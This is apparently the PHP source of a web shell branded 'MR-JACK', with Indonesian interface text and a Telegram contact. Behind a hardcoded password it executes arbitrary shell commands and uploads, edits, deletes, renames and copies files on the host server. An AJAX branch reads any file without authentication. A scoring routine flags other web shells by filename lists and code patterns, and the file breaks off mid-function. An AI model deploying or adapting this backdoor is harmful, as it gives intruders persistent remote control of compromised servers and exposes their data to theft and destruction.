<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
session_start();

$password = "oxonly";

// ===== HANDLE AJAX REQUEST SEBELUM APA PUN (PALING ATAS) =====
if (isset($_GET['ajax']) && $_GET['ajax'] === 'read' && isset($_GET['file'])) {
    $ajax_file = $_GET['file'];
    $SHELL_SELF_AJAX = basename(__FILE__);
    if (file_exists($ajax_file) && is_file($ajax_file)) {
        if (basename($ajax_file) === $SHELL_SELF_AJAX) {
            echo "// [PROTECTED] Cannot read shell file.\n";
            exit;
        }
        readfile($ajax_file);
    } else {
        echo "// File not found: " . $ajax_file;
    }
    exit;
}

// ===== AUTHENTICATION =====
if (isset($_POST['password'])) {
    if ($_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = 'Password Salah!<br><br>Hub Telegram: <a href="https://t.me/heyferr" target="_blank">@heyferr</a>';
    }
}

if (empty($_SESSION['authenticated'])) {
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Authentication</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}
body{
    background:#0f0f0f;
    color:#fff;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}
.login-box{
    width:360px;
    background:#171717;
    border:1px solid #ff0000;
    border-radius:12px;
    padding:35px;
    text-align:center;
    box-shadow:0 0 25px rgba(255,0,0,.3);
}
.icon{font-size:60px;margin-bottom:10px;}
h2{color:#fff;margin-bottom:20px;}
input[type=password]{width:100%;padding:13px;background:#111;border:1px solid #444;border-radius:6px;color:#fff;outline:none;transition:.3s;}
input[type=password]:focus{border-color:#ff0000;box-shadow:0 0 8px #ff0000;}
button{width:100%;padding:13px;margin-top:15px;background:#d60000;color:#fff;border:none;border-radius:6px;font-weight:bold;cursor:pointer;transition:.3s;}
button:hover{background:#ff0000;}
.error{color:#ff3b3b;margin-bottom:15px;font-weight:bold;}
.footer{margin-top:20px;font-size:13px;}
.footer a{color:#ff0000;text-decoration:none;}
.footer a:hover{text-decoration:underline;}
</style>
</head>
<body>
<div class="login-box">
<div class="icon">🎩</div>
<h2>Authentication</h2>
<?php if(isset($error)){ ?>
<div class="error"><?php echo $error; ?></div>
<?php } ?>
<form method="POST">
    <input type="password" name="password" placeholder="Enter Password" autocomplete="off" required>
    <button type="submit">LOGIN</button>
</form>
</div>
</body>
</html>
<?php
exit;
}

// ==================== MAIN SHELL ENGINE ====================

$SHELL_SELF = basename(__FILE__);

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($current_dir)) $current_dir = getcwd();
chdir($current_dir);

$user_ip = $_SERVER['REMOTE_ADDR'];
$server_ip = gethostbyname($_SERVER['SERVER_NAME']);
$server_os = php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('v') . ' ' . php_uname('m');
$server_software = $_SERVER['SERVER_SOFTWARE'];
$php_version = phpversion();

// ===== SUSPICIOUS FILE DETECTION =====
function is_suspicious_file($filepath, $filename) {
    $name_lower = strtolower($filename);
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    $exec_exts = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'shtml', 'inc', 'asp', 'aspx', 'jsp', 'cgi', 'pl', 'py', 'rb', 'sh'];
    if (!in_array($ext, $exec_exts)) return false;
    
    $score = 0;
    
    $exact_shells = [
        'shell.php', 'shells.php', 'cmd.php', 'wso.php', 'b374k.php',
        'c99.php', 'r57.php', 'bypass.php', 'andela.php', 'andela2.php',
        'uploader.php', 'elfinder.php', 'elfinder74.php', 'elfinder73.php',
        'fileman.php', 'filesman.php', '404.php', 'wp-login.php',
        'index.php', 'admin.php', 'config.php', 'backdoor.php',
        'jr-shell.php', 'jr-shellv2.php', 'mr-jack.php'
    ];
    if (in_array($name_lower, $exact_shells)) $score += 60;
    
    $suspicious_names = [
        'shell', 'backdoor', 'webshell', 'backd0r', 'b4ckd00r',
        'cmd', 'comand', 'command', 'bypass', 'b4pass',
        'exploit', 'inject', 'sqli', 'xss', 'rfi', 'lfi',
        'uploader', 'elfinder', 'fileman', 'filesman',
        'hack', 'crack', 'sheller', 'defac', 'ncx',
        'revshell', 'rev', 'revers', 'connectback',
        'eval', 'evil', 'd3v1l', 'pwn', 'pwned',
        'symlink', 'config', 'dump', 'dumpdb',
        '0xdef', 'inurl', 'indoxploit', 'kacak',
        'hunter', 'yabou', 'jr-shell', 'mr-jack',
        'webshells', 'shells', 'sheller'
    ];
    foreach ($suspicious_names as $kw) {
        if (strpos($name_lower, $kw) !== false) { $score += 25; break; }
    }
    
    if (!in_array($ext, ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'php8', 'inc'])) {
        return $score >= 30;
    }
    
    if (!is_readable($filepath)) return $score >= 30;
    $content = @file_get_contents($filepath, false, null, 0, 8192);
    if ($content === false || $content === '') return $score >= 30;
    $content_lower = strtolower($content);
    
    $inp = 0;
    if (preg_match('/\$_GET\s*\[/', $content)) $inp += 8;
    if (preg_match('/\$_POST\s*\[/', $content)) $inp += 8;
    if (preg_match('/\$_REQUEST\s*\[/', $content)) $inp += 8;
    if (preg_match('/\$_FILES\s*\[/', $content)) $inp += 8;
    if (preg_match('/\$_COOKIE\s*\[/', $content)) $inp += 4;
    
    foreach (['shell_exec', 'exec(', 'system(', 'passthru(', 'popen(', 'proc_open(', 'pcntl_exec('] as $f) {
        if (strpos($content_lower, $f) !== false) $score += 20;
    }
    
    if (strpos($content_lower, 'eval(') !== false) $score += 20;
    if (strpos($content_lower, 'assert(') !== false) $score += 15;
    if (strpos($content_lower, 'create_function(') !== false) $score += 15;
    if (strpos($content_lower, 'call_user_func(') !== false) $score += 10;
    if (strpos($content_lower, 'array_map(') !== false) $score += 10;
    
    $obs = 0;
    if (strpos($content_lower, 'base64_decode') !== false) $obs += 12;
    if (strpos($content_lower, 'gzinflate') !== false) $obs += 12;
    if (strpos($content_lower, 'gzuncompress') !== false) $obs += 12;
    if (strpos($content_lower, 'str_rot13') !== false) $obs += 10;
    if (preg_match('/\\\\x[0-9a-f]{2}/i', $content)) $obs += 10;
    if (preg_match('/\$[___]{3,}/', $content)) $obs += 18;
    if (preg_match('/\$_\[/', $content)) $obs += 15;
    if ($obs >= 20) $obs *= 1.5;
    $score += $obs;
    
    if ($inp >= 8 && $score >= 20) $score += 15;
    $score += $inp;
    
    if (strpos($content_lower, 'move_uploaded_file') !== false) $score += 12;
    if (strpos($content_lower, 'fwrite(') !== false || strpos($content_lower, 'fputs(') !== false) $score += 8;
    if (strpos($content_lower, 'file_put_contents(') !== false) $score += 8;
    if (strpos($content_lower, 'chmod(') !== false) $score += 6;
    if (strpos($content_lower, 'symlink(') !== false) $score += 10;
    if (strpos($content_lower, 'unlink(') !== false) $score += 5;
    
    foreach (['php_uname', 'gethostbyname', 'phpversion', 'getcwd', 'chdir'] as $f) {
        if (strpos($content_lower, $f) !== false) $score += 3;
    }
    
    if (strpos($content_lower, 'ini_set(') !== false) $score += 3;
    if (strpos($content_lower, 'error_reporting') !== false) $score += 2;
    if (strpos($content_lower, 'session_start') !== false) $score += 2;
    if (strpos($content_lower, 'set_time_limit') !== false) $score += 3;
    
    if (preg_match('/base64_decode.*gzinflate|gzinflate.*base64_decode/', $content_lower)) $score += 40;
    if (strpos($content_lower, 'eval(') !== false && strpos($content_lower, 'base64_decode') !== false) $score += 35;
    if ((strpos($content_lower, 'exec(') !== false || strpos($content_lower, 'system(') !== false || strpos($content_lower, 'shell_exec') !== false) && $inp >= 8) $score += 25;
    
    if (preg_match('/<form.*method\s*=\s*["\']post["\']/i', $content) && $score >= 15) $score += 15;
    if ((strpos($content_lower, 'execute') !== false || strpos($content_lower, 'command') !== false) && $inp >= 8) $score += 10;
    
    return $score >= 30;
}

// --- Handle actions ---
$msg = '';
$cmd_output = '';

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cmd_output = shell_exec($cmd . ' 2>&1');
}

if (isset($_POST['create_file'])) {
    $filename = trim($_POST['filename']);
    if ($filename) {
        if (!file_exists($filename)) {
            file_put_contents($filename, '');
            $msg = "File <strong>$filename</strong> created.";
        } else {
            $msg = "File <strong>$filename</strong> already exists.";
        }
    }
}

if (isset($_POST['create_folder'])) {
    $foldername = trim($_POST['foldername']);
    if ($foldername) {
        if (!is_dir($foldername)) {
            mkdir($foldername, 0755, true);
            $msg = "Directory <strong>$foldername</strong> created.";
        } else {
            $msg = "Directory <strong>$foldername</strong> already exists.";
        }
    }
}

if (isset($_FILES['uploaded_file'])) {
    $target = basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
        $msg = "File <strong>$target</strong> uploaded.";
    } else {
        $msg = "Upload failed.";
    }
}

if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_file($target)) {
        unlink($target);
        $msg = "File <strong>$target</strong> deleted.";
    } elseif (is_dir($target)) {
        function rrmdir($dir) {
            foreach (glob($dir . '/*') as $f) {
                is_dir($f) ? rrmdir($f) : unlink($f);
            }
            rmdir($dir);
        }
        rrmdir($target);
        $msg = "Directory <strong>$target</strong> deleted.";
    }
}

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = $_POST['rename_old'];
    $new = $_POST['rename_new'];
    if (file_exists($old) && !file_exists($new)) {
        rename($old, $new);
        $msg = "Renamed <strong>$old</strong> to <strong>$new</strong>.";
    } else {
        $msg = "Rename failed.";
    }
}

if (isset($_POST['copy_src']) && isset($_POST['copy_dst'])) {
    $src = $_POST['copy_src'];
    $dst = $_POST['copy_dst'];
    if (file_exists($src)) {
        if (is_file($src)) {
            copy($src, $dst);
            $msg = "Copied <strong>$src</strong> to <strong>$dst</strong>.";
        } elseif (is_dir($src)) {
            function rcopy($src2, $dst2) {
                if (!is_dir($dst2)) mkdir($dst2, 0755, true);
                foreach (glob($src2 . '/*') as $f) {
                    $target = $dst2 . '/' . basename($f);
                    is_dir($f) ? rcopy($f, $target) : copy($f, $target);
                }
            }
            rcopy($src, $dst);
            $msg = "Copied directory <strong>$src</strong> to <strong>$dst</strong>.";
        }
    } else {
        $msg = "Source not found.";
    }
}

if (isset($_POST['save_file'])) {
    $filepath = $_POST['filepath'];
    $filename = basename($filepath);
    if ($filename === $SHELL_SELF) {
        $msg = "❌ Cannot edit shell file (<strong>$SHELL_SELF</strong>)!";
    } else {
        $content = $_POST['file_content'];
        file_put_contents($filepath, $content);
        $msg = "File <strong>$filepath</strong> saved.";
    }
}

// --- Get directory listing ---
$items = [];
if (is_dir($current_dir)) {
    $dh = opendir($current_dir);
    while (($f = readdir($dh)) !== false) {
        if ($f != '.' && $f != '..') {
            $full = $current_dir . '/' . $f;
            $is_dir = is_dir($full);
            $is_suspicious = false;
            if (!$is_dir) {
                $is_suspicious = is_suspicious_file($full, $f);
            }
            $items[] = [
                'name' => $f,
                'is_dir' => $is_dir,
                'is_suspicious' => $is_suspicious,
                'is_shell_self' => (!$is_dir && $f === $SHELL_SELF),
                'size' => is_file($full) ? filesize($full) : 0,
                'perms' => substr(sprintf('%o', fileperms($full)), -4),
                'mtime' => date('Y-m-d H:i:s', filemtime($full))
            ];
        }
    }
    closedir($dh);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MR-JACK</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif;}
body{background:#0a0a0f;color:#e0e0e0;min-height:100vh;}

.header{position:relative;padding:18px 30px;display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;z-index:1;}
.header::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(135deg,#1a0000,#2d0000);z-index:-1;}
.header::after{content:'';position:absolute;bottom:-2px;left:0;right:0;height:3px;background:linear-gradient(90deg, #ff0000, #ff7700, #ffff00, #00ff00, #0077ff, #8b00ff, #ff0000);background-size:400% 100%;animation: rainbowBar 2s linear infinite;z-index:2;}
@keyframes rainbowBar{0%{background-position:0% 0%;}100%{background-position:400% 0%;}}
.header-left h1{color:#cc0000;font-size:26px;text-shadow:0 0 12px rgba(204,0,0,.4);letter-spacing:1px;}
.header-left h1 span{color:#fff;}
.header-right{text-align:right;font-size:13px;line-height:1.7;color:#aaa;}
.header-right strong{color:#fff;}
.header-right .label{color:#cc0000;font-weight:bold;}

.info-bar{background:#111;padding:12px 30px;border-bottom:1px solid #222;display:flex;flex-wrap:wrap;gap:18px;font-size:13px;color:#aaa;}
.info-bar .label{color:#cc0000;font-weight:bold;}
.info-bar .val{color:#fff;}

.actions{background:#0d0d14;padding:15px 30px;border-bottom:1px solid #1a1a2a;display:flex;flex-wrap:wrap;gap:12px;align-items:center;}
.actions form{display:inline-flex;align-items:center;gap:6px;}
.actions input[type=text],.actions input[type=password]{background:#1a1a2a;border:1px solid #333;border-radius:4px;padding:7px 10px;color:#fff;font-size:13px;outline:none;width:160px;}
.actions input[type=text]:focus,.actions input[type=password]:focus{border-color:#cc0000;}
.actions input[type=file]{color:#aaa;font-size:12px;max-width:180px;}
.btn{background:#2a2a3a;border:none;border-radius:4px;padding:7px 14px;color:#fff;cursor:pointer;font-size:12px;font-weight:bold;transition:.2s;}
.btn-red{background:#990000;color:#fff;}
.btn-red:hover{background:#cc0000;}
.btn-green{background:#006633;color:#fff;}
.btn-green:hover{background:#008844;}
.btn-blue{background:#003366;color:#fff;}
.btn-blue:hover{background:#004488;}
.btn-orange{background:#994d00;color:#fff;}
.btn-orange:hover{background:#cc6600;}
.btn:hover{filter:brightness(1.2);}
.cmd-box{flex:1;min-width:280px;display:flex;gap:6px;}
.cmd-box input[type=text]{flex:1;width:auto;min-width:150px;font-family:'Courier New',monospace;background:#0a0a10;border-color:#333;}
.cmd-box button{white-space:nowrap;}

.search-bar{background:#0d0d14;padding:10px 30px;border-bottom:1px solid #1a1a2a;display:flex;align-items:center;gap:10px;}
.search-bar input{flex:1;max-width:400px;background:#1a1a2a;border:1px solid #333;border-radius:4px;padding:8px 12px;color:#fff;font-size:13px;outline:none;}
.search-bar input:focus{border-color:#cc0000;}
.search-bar .search-hint{color:#666;font-size:11px;}

.msg{padding:10px 30px;background:#0a1a0a;border-bottom:1px solid #003300;color:#33ff33;font-size:13px;}
.msg.error{background:#1a0a0a;border-bottom:1px solid #330000;color:#ff4444;}

.dir-header{background:#12121a;padding:10px 30px;border-bottom:1px solid #222;font-size:13px;color:#aaa;display:flex;flex-wrap:wrap;align-items:center;gap:6px;}
.dir-header .dir-path{color:#cc0000;text-decoration:none;}
.dir-header .dir-path:hover{text-decoration:underline;color:#ff3333;}
.dir-header .dir-sep{color:#555;}
.dir-header .dir-label{color:#888;}
.dir-header .dir-current{color:#fff;font-weight:bold;}

tr.suspicious-row td{background:#002a1a !important;color:#66ff66 !important;}
tr.suspicious-row:hover td{background:#003d26 !important;}
tr.suspicious-row .name-cell a{color:#66ff66 !important;font-weight:bold;text-shadow:0 0 8px rgba(102,255,102,.2);}
tr.suspicious-row td:first-child{border-left:3px solid #00cc44;box-shadow:inset 0 0 15px rgba(0,204,68,.06);}
tr.suspicious-row .name-cell .suspicious-badge{display:inline-block;background:#003d1a;color:#00ff66;font-size:9px;padding:1px 7px;border-radius:3px;border:1px solid #006633;margin-left:6px;vertical-align:middle;letter-spacing:0.5px;}

tr.shell-self-row td{background:#1a0000 !important;color:#cc6666 !important;}
tr.shell-self-row:hover td{background:#2a0000 !important;}
tr.shell-self-row .name-cell a{color:#cc6666 !important;font-style:italic;}
tr.shell-self-row .self-badge{display:inline-block;background:#330000;color:#ff6666;font-size:9px;padding:1px 7px;border-radius:3px;border:1px solid #660000;margin-left:6px;vertical-align:middle;}

table{width:100%;border-collapse:collapse;}
th{background:#1a1a2a;padding:10px 12px;text-align:left;font-size:12px;color:#888;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #333;position:sticky;top:0;}
td{padding:8px 12px;border-bottom:1px solid #1a1a1a;font-size:13px;vertical-align:middle;}
tr:hover td{background:#11111a;}
tr.dir-row td{color:#fff;}
tr.file-row td{color:#bbb;}
tr.hidden-row{display:none !important;}

.icon-folder{color:#ff9900;margin-right:6px;font-size:14px;}
.icon-file{color:#6688cc;margin-right:6px;font-size:14px;}
.icon-suspicious{color:#66ff66;margin-right:6px;font-size:14px;text-shadow:0 0 8px rgba(102,255,102,.3);}
.icon-self{color:#cc6666;margin-right:6px;font-size:14px;}
.name-cell{max-width:350px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.name-cell a{text-decoration:none;}
.name-cell a:hover{text-decoration:underline;}
.dir-row .name-cell a{color:#ff9900;font-weight:bold;}
.file-row .name-cell a{color:#ccaa88;}
.action-links a{margin:0 4px;text-decoration:none;font-size:11px;padding:2px 7px;border-radius:3px;transition:.2s;display:inline-block;}
.action-links .link-edit{background:#003366;color:#88bbff;}
.action-links .link-edit:hover{background:#004488;}
.action-links .link-edit-disabled{background:#222;color:#555;cursor:not-allowed;}
.action-links .link-copy{background:#333300;color:#ffdd66;}
.action-links .link-copy:hover{background:#555500;}
.action-links .link-rename{background:#333311;color:#ffaa33;}
.action-links .link-rename:hover{background:#554422;}
.action-links .link-delete{background:#330000;color:#ff6666;}
.action-links .link-delete:hover{background:#550000;}

.cmd-output{background:#0a0a10;border:1px solid #333;border-top:2px solid #cc0000;border-radius:4px;padding:14px;margin:0 30px 10px;font-family:'Courier New',monospace;font-size:12px;color:#33ff33;white-space:pre-wrap;word-break:break-all;max-height:350px;overflow:auto;}

.modal-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.85);z-index:999;justify-content:center;align-items:center;}
.modal-overlay.active{display:flex;}
.modal{background:#1a1a2a;border:1px solid #444;border-radius:8px;width:90%;max-width:900px;max-height:88vh;display:flex;flex-direction:column;box-shadow:0 0 30px rgba(204,0,0,.2);}
.modal-header{background:#2a2a3a;padding:14px 20px;border-bottom:1px solid #444;display:flex;justify-content:space-between;align-items:center;}
.modal-header h3{color:#cc0000;font-size:16px;}
.modal-close{background:none;border:none;color:#888;font-size:22px;cursor:pointer;}
.modal-close:hover{color:#fff;}
.modal-body{padding:20px;overflow:auto;flex:1;}
.modal-body textarea{width:100%;min-height:400px;background:#0a0a10;border:1px solid #333;border-radius:4px;color:#33ff33;font-family:'Courier New',monospace;font-size:13px;padding:12px;outline:none;resize:vertical;}
.modal-body textarea:focus{border-color:#cc0000;}
.modal-footer{background:#2a2a3a;padding:12px 20px;border-top:1px solid #444;display:flex;gap:10px;justify-content:flex-end;}
.modal-footer .btn{min-width:85px;}
.modal-info-bar{background:#111;padding:8px 20px;border-bottom:1px solid #333;display:flex;align-items:center;gap:15px;font-size:12px;}
.modal-info-bar .milabel{color:#888;}
.modal-info-bar .mivalue{color:#88bbff;}

::-webkit-scrollbar{width:6px;height:6px;}
::-webkit-scrollbar-track{background:#0a0a0f;}
::-webkit-scrollbar-thumb{background:#333;border-radius:3px;}
::-webkit-scrollbar-thumb:hover{background:#555;}

@media(max-width:768px){
.header,.info-bar,.actions,.search-bar{padding:12px 15px;}
.actions{flex-direction:column;align-items:stretch;}
.actions form{flex-wrap:wrap;}
.cmd-box{flex-direction:column;}
.cmd-box input[type=text]{width:100%;}
table{font-size:12px;}
td,th{padding:6px 8px;}
.name-cell{max-width:150px;}
}
</style>
</head>
<body>

<div class="header">
    <div class="header-left"><h1>MR<span>-JACK</span></h1></div>
    <div class="header-right">
        <div><span class="label">Your IP:</span> <strong><?php echo $user_ip; ?></strong></div>
        <div><span class="label">Server IP:</span> <strong><?php echo $server_ip; ?></strong></div>
    </div>
</div>

<div class="info-bar">
    <div><span class="label">Server:</span> <span class="val"><?php echo htmlspecialchars($server_os); ?></span></div>
    <div><span class="label">Software:</span> <span class="val"><?php echo htmlspecialchars($server_software); ?></span></div>
    <div><span class="label">PHP:</span> <span class="val"><?php echo $php_version; ?></span></div>
    <div><span class="label">Shell:</span> <span class="val"><?php echo $SHELL_SELF; ?></span></div>
</div>

<div class="actions">
    <form method="POST" style="display:inline-flex;">
        <input type="text" name="filename" placeholder="File name">
        <button type="submit" name="create_file" class="btn btn-green">Create File</button>
    </form>
    <form method="POST" style="display:inline-flex;">
        <input type="text" name="foldername" placeholder="Folder name">
        <button type="submit" name="create_folder" class="btn btn-blue">Create Folder</button>
    </form>
    <form method="POST" enctype="multipart/form-data" style="display:inline-flex;">
        <input type="file" name="uploaded_file">
        <button type="submit" class="btn btn-orange">Upload File</button>
    </form>
    <div style="flex:1;"></div>
    <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" class="btn" style="text-decoration:none;background:#222;color:#aaa;">⬆ Go Up</a>
</div>

<div class="actions" style="border-top:1px solid #1a1a2a;">
    <form method="POST" class="cmd-box">
        <input type="text" name="cmd" placeholder="Enter command" value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
        <button type="submit" class="btn btn-red">Execute</button>
    </form>
</div>

<?php if ($cmd_output !== ''): ?>
<div class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></div>
<?php endif; ?>

<?php if ($msg): 
$is_error = (strpos($msg, '❌') !== false);
?>
<div class="msg <?php echo $is_error ? 'error' : ''; ?>"><?php echo $msg; ?></div>
<?php endif; ?>

<div class="search-bar">
    <span style="color:#888;font-size:13px;">🔍</span>
    <input type="text" id="searchInput" placeholder="Cari file / folder..." oninput="filterTable(this.value)">
    <span class="search-hint">(<?php echo $SHELL_SELF; ?> tidak bisa di-edit | Ctrl+F | ESC reset)</span>
    <span style="margin-left:auto;color:#888;font-size:12px;" id="itemCount"><?php echo count($items); ?> items</span>
</div>

<div class="dir-header">
    <span class="dir-label">📁</span>
    <?php
    $parts = explode('/', $current_dir);
    $cumulative = '';
    foreach ($parts as $i => $part):
        if ($part === '') continue;
        $cumulative .= '/' . $part;
        if ($i < count($parts) - 1):
    ?>
        <a href="?dir=<?php echo urlencode($cumulative); ?>" class="dir-path"><?php echo htmlspecialchars($part); ?></a>
        <span class="dir-sep">/</span>
    <?php else: ?>
        <span class="dir-current"><?php echo htmlspecialchars($part); ?></span>
    <?php endif;
    endforeach; ?>
</div>

<table id="fileTable">
<thead>
<tr>
    <th style="width:38%;">Name</th>
    <th style="width:10%;">Size</th>
    <th style="width:10%;">Perms</th>
    <th style="width:18%;">Modified</th>
    <th style="width:24%;">Actions</th>
</tr>
</thead>
<tbody>
<?php
usort($items, function($a, $b) {
    if ($a['is_dir'] != $b['is_dir']) return $a['is_dir'] ? -1 : 1;
    return strcasecmp($a['name'], $b['name']);
});

foreach ($items as $item):
    $full_path = $current_dir . '/' . $item['name'];
    $url_name = urlencode($item['name']);
    $is_dir = $item['is_dir'];
    $is_suspicious = $item['is_suspicious'];
    $is_shell_self = $item['is_shell_self'];

    if ($is_dir) {
        $row_class = 'dir-row';
        $icon = '📁';
        $icon_class = 'icon-folder';
        $badge = '';
        $can_edit = false;
    } elseif ($is_shell_self) {
        $row_class = 'shell-self-row';
        $icon = '🔒';
        $icon_class = 'icon-self';
        $badge = '<span class="self-badge">SHELL SELF</span>';
        $can_edit = false;
    } elseif ($is_suspicious) {
        $row_class = 'suspicious-row';
        $icon = '⚠️';
        $icon_class = 'icon-suspicious';
        $badge = '<span class="suspicious-badge">SHELL</span>';
        $can_edit = true;
    } else {
        $row_class = 'file-row';
        $icon = '📄';
        $icon_class = 'icon-file';
        $badge = '';
        $can_edit = true;
    }

    $size_display = $is_dir ? '-' : ($item['size'] < 1024 ? $item['size'] . ' B' : ($item['size'] < 1048576 ? round($item['size']/1024,1) . ' KB' : round($item['size']/1048576,1) . ' MB'));
?>
<tr class="<?php echo $row_class; ?>" data-name="<?php echo htmlspecialchars(strtolower($item['name'])); ?>">
    <td class="name-cell">
        <span class="<?php echo $icon_class; ?>"><?php echo $icon; ?></span>
        <?php if ($is_dir): ?>
        <a href="?dir=<?php echo urlencode($full_path); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
        <?php else: ?>
        <a href="#" onclick="<?php echo $can_edit ? "editFile('".addslashes($full_path)."')" : "alert('Tidak bisa mengedit file shell sendiri!')"; ?>;return false;"><?php echo htmlspecialchars($item['name']); ?></a>
        <?php echo $badge; ?>
        <?php endif; ?>
    </td>
    <td><?php echo $size_display; ?></td>
    <td><?php echo $item['perms']; ?></td>
    <td><?php echo $item['mtime']; ?></td>
    <td class="action-links">
        <?php if (!$is_dir): ?>
            <?php if ($can_edit): ?>
            <a href="#" class="link-edit" onclick="editFile('<?php echo addslashes($full_path); ?>');return false;">✏ Edit</a>
            <?php else: ?>
            <span class="link-edit-disabled">✏ Edit</span>
            <?php endif; ?>
        <?php endif; ?>
        <a href="#" class="link-copy" onclick="copyItem('<?php echo addslashes($item['name']); ?>');return false;">📋 Copy</a>
        <a href="#" class="link-rename" onclick="renameItem('<?php echo addslashes($item['name']); ?>');return false;">✎ Rename</a>
        <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo $url_name; ?>" class="link-delete" onclick="return confirm('Delete <?php echo $item['name']; ?>?')">🗑 Delete</a>
    </td>
</tr>
<?php endforeach; ?>
</tbody>
</table>

<div class="modal-overlay" id="editModal">
    <div class="modal">
        <div class="modal-header">
            <h3>📝 Edit File</h3>
            <button class="modal-close" onclick="closeModal('editModal')">&times;</button>
        </div>
        <div class="modal-info-bar">
            <span><span class="milabel">File:</span> <span class="mivalue" id="editFilenameDisplay"></span></span>
            <span><span class="milabel">Path:</span> <span class="mivalue" id="editPathDisplay"></span></span>
        </div>
        <form method="POST" id="editForm">
            <input type="hidden" name="filepath" id="editFilepath">
            <div class="modal-body">
                <textarea name="file_content" id="editContent" spellcheck="false" wrap="off"></textarea>
            </div>
            <div class="modal-footer">
                <span style="color:#666;font-size:11px;margin-right:auto;">⏎ Ctrl+Enter to save</span>
                <button type="button" class="btn" onclick="closeModal('editModal')">Cancel</button>
                <button type="submit" name="save_file" class="btn btn-red">💾 Save</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay" id="copyModal">
    <div class="modal" style="max-width:450px;">
        <div class="modal-header"><h3>📋 Copy</h3><button class="modal-close" onclick="closeModal('copyModal')">&times;</button></div>
        <form method="POST">
            <div class="modal-body">
                <div style="margin-bottom:12px;color:#aaa;font-size:13px;">Source:</div>
                <input type="text" name="copy_src" id="copySrc" readonly style="width:100%;background:#0a0a10;border:1px solid #333;border-radius:4px;padding:10px;color:#ff9900;font-size:13px;outline:none;">
                <div style="margin:15px 0 12px;color:#aaa;font-size:13px;">Destination:</div>
                <input type="text" name="copy_dst" id="copyDst" placeholder="Enter destination path" style="width:100%;background:#1a1a2a;border:1px solid #333;border-radius:4px;padding:10px;color:#fff;font-size:13px;outline:none;">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('copyModal')">Cancel</button>
                <button type="submit" class="btn btn-blue">📋 Copy</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay" id="renameModal">
    <div class="modal" style="max-width:450px;">
        <div class="modal-header"><h3>✎ Rename</h3><button class="modal-close" onclick="closeModal('renameModal')">&times;</button></div>
        <form method="POST">
            <div class="modal-body">
                <div style="margin-bottom:12px;color:#aaa;font-size:13px;">Current name:</div>
                <input type="text" name="rename_old" id="renameOld" readonly style="width:100%;background:#0a0a10;border:1px solid #333;border-radius:4px;padding:10px;color:#ff9900;font-size:13px;outline:none;">
                <div style="margin:15px 0 12px;color:#aaa;font-size:13px;">New name:</div>
                <input type="text" name="rename_new" id="renameNew" placeholder="Enter new name" style="width:100%;background:#1a1a2a;border:1px solid #333;border-radius:4px;padding:10px;color:#fff;font-size:13px;outline:none;">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn" onclick="closeModal('renameModal')">Cancel</button>
                <button type="submit" class="btn btn-orange">✎ Rename</button>
            </div>
        </form>
    </div>
</div>

<script>
function showModal(id) { document.getElementById(id).classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); }
document.querySelectorAll('.modal-overlay').forEach(el => {
    el.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('active'); });
});
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal-overlay.active').forEach(m => m.classList.remove('active'));
    }
});
document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
        var editForm = document.getElementById('editForm');
        if (editForm && document.getElementById('editModal').classList.contains('active')) {
            editForm.submit();
        }
    }
});

function filterTable(query) {
    var q = query.toLowerCase().trim();
    var rows = document.querySelectorAll('#fileTable tbody tr');
    var visible = 0;
    rows.forEach(function(row) {
        var name = row.getAttribute('data-name') || '';
        if (q === '' || name.indexOf(q) !== -1) {
            row.classList.remove('hidden-row');
            visible++;
        } else {
            row.classList.add('hidden-row');
        }
    });
    document.getElementById('itemCount').textContent = visible + ' / <?php echo count($items); ?> items';
}

document.addEventListener('keydown', function(e) {
    if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
        e.preventDefault();
        var inp = document.getElementById('searchInput');
        inp.focus();
        inp.select();
    }
});

document.getElementById('searchInput').addEventListener('keydown', function(e) {
    if (e.key === 'Escape') { this.value = ''; filterTable(''); this.blur(); }
});

function editFile(path) {
    var filename = path.split('/').pop();
    var shellSelf = '<?php echo $SHELL_SELF; ?>';
    if (filename === shellSelf) {
        alert('❌ Tidak bisa mengedit file shell (' + shellSelf + ') sendiri!');
        return;
    }
